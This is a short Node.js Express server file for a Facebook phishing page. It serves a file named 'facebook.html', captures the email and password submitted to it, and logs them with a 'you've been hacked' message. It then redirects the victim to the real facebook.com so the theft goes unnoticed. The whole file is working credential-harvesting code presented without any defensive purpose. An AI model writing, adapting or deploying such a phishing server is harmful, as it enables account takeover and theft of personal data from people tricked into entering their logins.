const express = require("express");
const app = express();

const path = require("path");
const bodyParser = require("body-parser");

app.use(bodyParser.urlencoded({extended: false}));

const PORT = 4000;

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "views", "facebook.html"))
})

app.post("/", (req, res)=>{
    const data = req.body;
    console.log(`Your email is: ${data.email}, your passowrd is: ${data.password}. Congratulations you've been hacked.`)
    res.redirect("https://www.facebook.com");
})


app.listen(PORT, ()=>{
    console.log(`App is running on port ${PORT}`);
});